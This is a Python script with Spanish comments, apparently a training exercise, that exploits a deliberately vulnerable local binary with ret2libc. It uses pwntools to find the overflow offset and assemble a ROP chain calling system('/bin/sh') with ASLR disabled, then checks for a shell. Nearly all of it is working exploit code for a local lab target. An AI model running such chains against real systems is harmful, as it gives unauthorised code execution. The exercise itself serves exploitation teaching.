#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""C2 - ret2libc portatil con la API ROP() de pwntools.
Mismo objetivo que B2 (system("/bin/sh"), ASLR desactivada) pero la
cadena la arma el objeto ROP: rop.call() coloca argumentos y destino,
rop.raw() inserta casillas crudas (alineacion), rop.chain() serializa
y rop.dump() muestra la cadena armada. Nada escrito a mano salvo el
ret de alineacion, que aqui se inserta de forma quirurgica.
USO: python3 c2_ropapi.py"""
from pwn import *
import os
import re
import subprocess
import time

context.arch = 'amd64'
context.log_level = 'info'

BIN = './c2_ropapi'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'c2_ropapi.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

elf = ELF(BIN, checksec=False)

# ------------------------------------------------------------------
# FASE 0 - base de libc via ldd con ASLR fuera (heredado de B2)
# ------------------------------------------------------------------
ARCH = os.uname().machine
ldd_out = subprocess.run(
    ['setarch', ARCH, '-R', 'ldd', BIN],
    capture_output=True, text=True).stdout
m = re.search(r'libc\.so\.6 => (\S+) \(0x([0-9a-f]+)\)', ldd_out)
if not m:
    log.failure('ldd no mostro libc; verifica setarch -R y ASLR.')
    raise SystemExit(1)
libc_path = m.group(1)
libc_base = int(m.group(2), 16)
log.info('libc: %s | base fija %#x (ASLR fuera)', libc_path, libc_base)

libc = ELF(libc_path, checksec=False)
libc.address = libc_base            # reubica TODOS los simbolos de golpe
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))

# ------------------------------------------------------------------
# FASE 1 - offset dinamico: patron ciclico + corefile (metodo A2)
# ------------------------------------------------------------------
io = process(['setarch', ARCH, '-R', BIN])
io.recvuntil(b'pero libc si')
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes', offset)

# ------------------------------------------------------------------
# FASE 2 - la cadena la arma ROP() sobre el pool [elf, libc]:
#   rop.call(destino, args) elige el trampolin (pop rdi; ret) y apila
#   los argumentos por ti; rop.raw() mete casillas crudas; rop.dump()
#   imprime el plano de la cadena. La alineacion de movaps (B1) la
#   insertamos ANTES de system, separando la ultima casilla.
# ------------------------------------------------------------------
rop = ROP([elf, libc])                 # pool combinado de gadgets
rop.call(system, [binsh])              # pwntools arma [pop_rdi][binsh][system]
chain = rop.chain()                    # serializacion: bytes listos
ret_g = rop.find_gadget(['ret'])[0]    # alineacion (el ret suelto de B1)
payload = (b'A' * offset
           + chain[:-8]                # [pop_rdi][binsh] tal cual
           + p64(ret_g)                # + ret de alineacion quirurgico
           + chain[-8:])               # + system (ultima casilla)
log.info('Cadena segun rop.dump():\n%s', '\n'.join(rop.dump()))
assert b'\n' not in payload, 'gets() cortaria el payload en el primer 0x0a'

io = process(['setarch', ARCH, '-R', BIN])   # ASLR fuera, como el ldd
io.recvuntil(b'pero libc si')
io.sendline(payload)
time.sleep(0.5)                     # dejar que system() arme el shell
io.sendline(b'echo PWNED_C2_$(id -u); id; exit')   # prueba de vida
salida = io.recvall(timeout=4)
io.close()

if b'PWNED_C2' in salida:
    log.success('C2 SUPERADO: ret2libc con API ROP(): misma tecnica, '
                'cadena delegada a pwntools.')
    log.info('Comparado con B2: cero casillas escritas a mano salvo la '
             'alineacion; rop.dump() te mostro el plano.')
else:
    log.failure('C2: sin shell. Pistas: setarch -R en ldd Y en el proceso, '
                'ROP([elf, libc]) para el pool de gadgets, ret extra.')
